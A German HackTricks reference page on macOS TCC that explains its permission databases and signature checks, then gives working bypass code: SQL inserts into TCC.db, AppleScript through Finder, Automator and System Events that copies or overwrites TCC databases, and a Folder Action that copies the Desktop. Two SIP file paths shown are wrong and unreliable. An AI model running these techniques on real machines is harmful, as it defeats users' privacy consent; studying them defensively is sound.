# macOS TCC

<details>

<summary><strong>Erfahren Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys einreichen.

</details>

## **Grundlegende Informationen**

**TCC (Transparenz, Einwilligung und Kontrolle)** ist ein Sicherheitsprotokoll, das sich auf die Regulierung von Anwendungsrechten konzentriert. Seine Hauptaufgabe besteht darin, sensible Funktionen wie **Standortdienste, Kontakte, Fotos, Mikrofon, Kamera, Zugänglichkeit und Vollzugriff auf die Festplatte** zu schützen. Indem es explizite Benutzerzustimmung vor der Gewährung von App-Zugriff auf diese Elemente vorschreibt, verbessert TCC die Privatsphäre und die Benutzerkontrolle über ihre Daten.

Benutzer stoßen auf TCC, wenn Anwendungen Zugriff auf geschützte Funktionen anfordern. Dies ist sichtbar durch eine Aufforderung, die es Benutzern ermöglicht, **den Zugriff zu genehmigen oder abzulehnen**. Darüber hinaus ermöglicht TCC direkte Benutzeraktionen wie das **Ziehen und Ablegen von Dateien in eine Anwendung**, um den Zugriff auf bestimmte Dateien zu gewähren und sicherzustellen, dass Anwendungen nur auf das zugreifen können, was ausdrücklich erlaubt ist.

![Ein Beispiel für eine TCC-Aufforderung](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** wird vom **Daemon** in `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` verwaltet und in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` konfiguriert (Registrierung des Mach-Dienstes `com.apple.tccd.system`).

Es gibt einen **Benutzermodus tccd**, der pro angemeldetem Benutzer in `/System/Library/LaunchAgents/com.apple.tccd.plist` definiert ist und die Mach-Dienste `com.apple.tccd` und `com.apple.usernotifications.delegate.com.apple.tccd` registriert.

Hier sehen Sie den als System und als Benutzer ausgeführten tccd:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Berechtigungen werden **vom übergeordneten** Anwendungsprozess vererbt und die **Berechtigungen** werden anhand der **Bundle-ID** und der **Entwickler-ID** verfolgt.

### TCC-Datenbanken

Die Erlaubnisse/Verweigerungen werden dann in einigen TCC-Datenbanken gespeichert:

- Die systemweite Datenbank in **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Diese Datenbank ist **SIP-geschützt**, daher kann nur ein SIP-Bypass in sie schreiben.
- Die Benutzer-TCC-Datenbank **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** für benutzerspezifische Einstellungen.
- Diese Datenbank ist geschützt, sodass nur Prozesse mit hohen TCC-Berechtigungen wie Vollzugriff auf das Laufwerk darauf schreiben können (aber sie ist nicht durch SIP geschützt).

{% hint style="warning" %}
Die zuvor genannten Datenbanken sind auch **TCC-geschützt für Lesezugriff**. Sie werden also **nicht in der Lage sein, Ihre reguläre Benutzer-TCC-Datenbank zu lesen**, es sei denn, es handelt sich um einen Prozess mit hohen TCC-Berechtigungen.

Dennoch ist zu beachten, dass ein Prozess mit diesen hohen Berechtigungen (wie **FDA** oder **`kTCCServiceEndpointSecurityClient`**) in der Lage sein wird, in die Benutzer-TCC-Datenbank zu schreiben.
{% endhint %}

- Es gibt eine **dritte** TCC-Datenbank in **`/var/db/locationd/clients.plist`**, um Clients zu kennzeichnen, die auf **Ortungsdienste zugreifen** dürfen.
- Die durch SIP geschützte Datei **`/Users/carlospolop/Downloads/REG.db`** (auch vor Lesezugriff mit TCC geschützt) enthält die **Standorte** aller **gültigen TCC-Datenbanken**.
- Die durch SIP geschützte Datei **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (auch vor Lesezugriff mit TCC geschützt) enthält weitere gewährte TCC-Berechtigungen.
- Die durch SIP geschützte Datei **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (aber von jedem lesbar) ist eine Liste von Anwendungen, die eine TCC-Ausnahme erfordern.

{% hint style="success" %}
Die TCC-Datenbank in **iOS** befindet sich in **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
Das **Benachrichtigungscenter-UI** kann **Änderungen in der System-TCC-Datenbank** vornehmen:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Benutzer können jedoch **Regeln löschen oder abfragen** mit dem Befehlszeilen-Dienstprogramm **`tccutil`**.
{% endhint %}

#### Datenbanken abfragen

{% tabs %}
{% tab title="Benutzer-DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="Systemdatenbank" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Durch Überprüfen beider Datenbanken können Sie die Berechtigungen überprüfen, die einer App erlaubt, verboten oder nicht erteilt wurden (es wird danach gefragt).
{% endhint %}

* Der **`service`** ist die TCC **Berechtigungs**-Zeichenfolgenrepräsentation
* Der **`client`** ist die **Bundle-ID** oder der **Pfad zur ausführbaren Datei** mit den Berechtigungen
* Der **`client_type`** gibt an, ob es sich um eine Bundle-Kennung (0) oder einen absoluten Pfad (1) handelt

<details>

<summary>Wie man es ausführt, wenn es sich um einen absoluten Pfad handelt</summary>

Führen Sie einfach **`launctl load your_bin.plist`** aus, mit einer Plist wie:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* Der **`auth_value`** kann verschiedene Werte haben: denied(0), unknown(1), allowed(2) oder limited(3).
* Der **`auth_reason`** kann die folgenden Werte annehmen: Error(1), Benutzerzustimmung(2), Benutzereinstellung(3), Systemeinstellung(4), Dienstrichtlinie(5), MDM-Richtlinie(6), Überschreibungsrichtlinie(7), Fehlender Verwendungszweck(8), Aufforderungszeitüberschreitung(9), Preflight Unbekannt(10), Berechtigt(11), App-Typ-Richtlinie(12)
* Das Feld **csreq** dient dazu, anzuzeigen, wie die auszuführende Binärdatei überprüft und die TCC-Berechtigungen erteilt werden sollen:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Für weitere Informationen zu den **anderen Feldern** der Tabelle [**überprüfen Sie diesen Blog-Beitrag**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Sie können auch die **bereits erteilten Berechtigungen** für Apps in `Systemeinstellungen --> Sicherheit & Datenschutz --> Datenschutz --> Dateien und Ordner` überprüfen.

{% hint style="success" %}
Benutzer können Regeln **mit `tccutil` löschen oder abfragen**.
{% endhint %}

#### TCC-Berechtigungen zurücksetzen
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Signaturüberprüfungen

Die TCC **Datenbank** speichert die **Bundle-ID** der Anwendung, aber sie **speichert** auch **Informationen** über die **Signatur**, um sicherzustellen, dass die App, die um die Erlaubnis bittet, die richtige ist.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Daher können andere Anwendungen mit demselben Namen und derselben Bundle-ID nicht auf die gewährten Berechtigungen anderer Apps zugreifen.
{% endhint %}

### Berechtigungen & TCC-Berechtigungen

Apps müssen nicht nur um Ressourcen bitten und Zugriff erhalten, sie müssen auch über die entsprechenden Berechtigungen verfügen. Zum Beispiel hat Telegram die Berechtigung `com.apple.security.device.camera`, um Zugriff auf die Kamera anzufordern. Eine App, die diese Berechtigung nicht hat, kann nicht auf die Kamera zugreifen (und der Benutzer wird nicht einmal nach den Berechtigungen gefragt).

Apps benötigen jedoch keine spezifischen Berechtigungen, um auf bestimmte Benutzerordner wie `~/Desktop`, `~/Downloads` und `~/Documents` zuzugreifen. Das System wird den Zugriff transparent handhaben und den Benutzer bei Bedarf auffordern.

Die Apps von Apple generieren keine Aufforderungen. Sie enthalten vorab gewährte Rechte in ihrer Berechtigungsliste, was bedeutet, dass sie niemals ein Popup generieren werden und auch nicht in einer der TCC-Datenbanken auftauchen werden. Zum Beispiel:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Dies wird verhindern, dass der Kalender den Benutzer auffordert, auf Erinnerungen, den Kalender und das Adressbuch zuzugreifen.

{% hint style="success" %}
Neben einigen offiziellen Dokumentationen zu Berechtigungen ist es auch möglich, inoffizielle **interessante Informationen zu Berechtigungen unter** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) **zu finden**.
{% endhint %}

Einige TCC-Berechtigungen sind: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Es gibt keine öffentliche Liste, die alle definiert, aber Sie können diese [**Liste der bekannten**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) überprüfen.

### Sensible ungeschützte Orte

* $HOME (selbst)
* $HOME/.ssh, $HOME/.aws, usw.
* /tmp

### Benutzerabsicht / com.apple.macl

Wie bereits erwähnt, ist es möglich, **einer App Zugriff auf eine Datei zu gewähren, indem man sie per Drag & Drop darauf zieht**. Dieser Zugriff wird in keiner TCC-Datenbank angegeben, sondern als **erweitertes Attribut der Datei** gespeichert. Dieses Attribut wird die **UUID** der zugelassenen App speichern:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Es ist merkwürdig, dass das Attribut **`com.apple.macl`** vom **Sandbox** verwaltet wird, nicht von tccd.

Beachten Sie auch, dass wenn Sie eine Datei verschieben, die die UUID einer App auf Ihrem Computer erlaubt, auf einen anderen Computer, weil die gleiche App unterschiedliche UIDs haben wird, wird sie keinen Zugriff auf diese App gewähren.
{% endhint %}

Das erweiterte Attribut `com.apple.macl` **kann nicht gelöscht werden** wie andere erweiterte Attribute, da es **durch SIP geschützt ist**. Wie jedoch [**in diesem Beitrag erklärt**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), ist es möglich, es zu deaktivieren, indem man die Datei **zippt**, sie **löscht** und sie **entzippt**.

## TCC Privilegieneskalation & Umgehungen

### Einfügen in TCC

Wenn Sie zu einem bestimmten Zeitpunkt Schreibzugriff auf eine TCC-Datenbank erhalten, können Sie etwas Ähnliches wie das Folgende verwenden, um einen Eintrag hinzuzufügen (entfernen Sie die Kommentare):

<details>

<summary>Beispiel für das Einfügen in TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Nutzlasten

Wenn es Ihnen gelungen ist, in eine App mit einigen TCC-Berechtigungen einzudringen, überprüfen Sie die folgende Seite mit TCC-Nutzlasten, um sie zu missbrauchen:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Apple Events

Erfahren Sie mehr über Apple Events in:

{% content-ref url="macos-apple-events.md" %}
[macos-apple-events.md](macos-apple-events.md)
{% endcontent-ref %}

### Automatisierung (Finder) zu FDA\*

Der TCC-Name der Automatisierungsberechtigung lautet: **`kTCCServiceAppleEvents`**\
Diese spezifische TCC-Berechtigung gibt auch die **Anwendung an, die im TCC-Datenbank verwaltet werden kann** (so dass die Berechtigungen nicht einfach alles verwalten dürfen).

**Finder** ist eine Anwendung, die **immer FDA hat** (auch wenn sie nicht im UI erscheint), daher können Sie, wenn Sie **Automatisierungs**-Privilegien darüber haben, seine Privilegien missbrauchen, um **einige Aktionen auszuführen**.\
In diesem Fall würde Ihre App die Berechtigung **`kTCCServiceAppleEvents`** über **`com.apple.Finder`** benötigen.

{% tabs %}
{% tab title="Benutzer TCC.db stehlen" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Systeme TCC.db stehlen" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Sie könnten dies missbrauchen, um **Ihre eigene Benutzer-TCC-Datenbank zu erstellen**.

{% hint style="warning" %}
Mit dieser Berechtigung können Sie den Finder auffordern, auf TCC-gesperrte Ordner zuzugreifen und Ihnen die Dateien zu geben, aber soweit ich weiß, werden Sie **nicht in der Lage sein, Finder dazu zu bringen, beliebigen Code auszuführen**, um seinen FDA-Zugriff vollständig auszunutzen.

Daher werden Sie nicht in der Lage sein, die vollen FDA-Fähigkeiten auszunutzen.
{% endhint %}

Dies ist die TCC-Aufforderung, um Automatisierungsrechte über den Finder zu erhalten:

<figure><img src="../../../../.gitbook/assets/image (24).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Beachten Sie, dass die **Automator**-App die TCC-Berechtigung **`kTCCServiceAppleEvents`** hat und **jede App** steuern kann, wie z. B. den Finder. Daher könnten Sie, wenn Sie die Berechtigung haben, Automator zu steuern, auch den **Finder** mit einem Code wie dem unten stehenden steuern:
{% endhint %}

<details>

<summary>Erhalten Sie eine Shell innerhalb von Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Das Gleiche gilt für die **Script Editor-App,** sie kann den Finder steuern, aber mit einem AppleScript können Sie sie nicht zwingen, ein Skript auszuführen.

### Automatisierung (SE) für einige TCC

**System Events können Ordneraktionen erstellen, und Ordneraktionen können auf einige TCC-Ordner zugreifen** (Desktop, Dokumente & Downloads), daher kann ein Skript wie das folgende verwendet werden, um dieses Verhalten auszunutzen:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automatisierung (SE) + Barrierefreiheit (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** für FDA\*

Automatisierung auf **`System Events`** + Barrierefreiheit (**`kTCCServicePostEvent`**) ermöglicht das Senden von **Tastatureingaben an Prozesse**. Auf diese Weise könnten Sie Finder missbrauchen, um die TCC.db des Benutzers zu ändern oder FDA an eine beliebige App zu vergeben (obwohl möglicherweise ein Passwort dafür angefordert wird).

Beispiel für das Überschreiben der TCC.db des Benutzers durch Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` zu FDA\*

Überprüfen Sie diese Seite für einige [**Payloads zur Ausnutzung der Zugriffsberechtigungen für Barrierefreiheit**](macos-tcc-payloads.md#accessibility), um z. B. zu FDA\* zu eskalieren oder einen Keylogger auszuführen.

### **Endpoint Security Client zu FDA**

Wenn Sie **`kTCCServiceEndpointSecurityClient`** haben, haben Sie FDA. Ende.

### Systemrichtlinie SysAdmin-Datei zu FDA

**`kTCCServiceSystemPolicySysAdminFiles`** ermöglicht es, das Attribut **`NFSHomeDirectory`** eines Benutzers zu **ändern**, das sein Benutzerverzeichnis ändert und somit das Umgehen von TCC ermöglicht.

### Benutzer-TCC-DB zu FDA

Durch das Erlangen von **Schreibberechtigungen** über die **Benutzer-TCC-Datenbank können Sie sich keine **`FDA`**-Berechtigungen gewähren, nur diejenigen, die in der Systemdatenbank leben, können das gewähren.

Aber Sie können sich **`Automatisierungsrechte für Finder`** geben und die vorherige Technik missbrauchen, um zu FDA\* zu eskalieren.

### **FDA zu TCC-Berechtigungen**

Der TCC-Name für **Voller Festplattenzugriff** ist **`kTCCServiceSystemPolicyAllFiles`**

Ich denke nicht, dass dies eine echte Eskalation ist, aber nur für den Fall, dass Sie es nützlich finden: Wenn Sie ein Programm mit FDA steuern, können Sie die Benutzer-TCC-Datenbank **ändern und sich jeden Zugriff gewähren**. Dies kann als Persistenztechnik nützlich sein, falls Sie Ihre FDA-Berechtigungen verlieren könnten.

### **SIP-Umgehung zu TCC-Umgehung**

Die System-TCC-Datenbank ist durch **SIP** geschützt, deshalb können nur Prozesse mit den **angegebenen Berechtigungen** sie ändern. Daher, wenn ein Angreifer eine **SIP-Umgehung** über eine **Datei** findet (die Möglichkeit, eine von SIP eingeschränkte Datei zu ändern), wird er in der Lage sein:

* Den Schutz einer TCC-Datenbank aufheben und sich alle TCC-Berechtigungen geben. Er könnte z. B. eine dieser Dateien missbrauchen:
* Die TCC-Systemdatenbank
* REG.db
* MDMOverrides.plist

Es gibt jedoch eine andere Möglichkeit, diese **SIP-Umgehung zu TCC-Umgehung** zu missbrauchen, die Datei `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` ist eine Liste von Anwendungen, die eine TCC-Ausnahme erfordern. Daher, wenn ein Angreifer den SIP-Schutz von dieser Datei entfernen und seine **eigene Anwendung hinzufügen** kann, wird die Anwendung in der Lage sein, TCC zu umgehen.\
Zum Beispiel, um Terminal hinzuzufügen:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
### AllowApplicationsList.plist:

Die `AllowApplicationsList.plist` Datei enthält eine Liste von Anwendungen, die Zugriff auf geschützte Bereiche des Systems haben.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Umgehungen

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referenzen

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
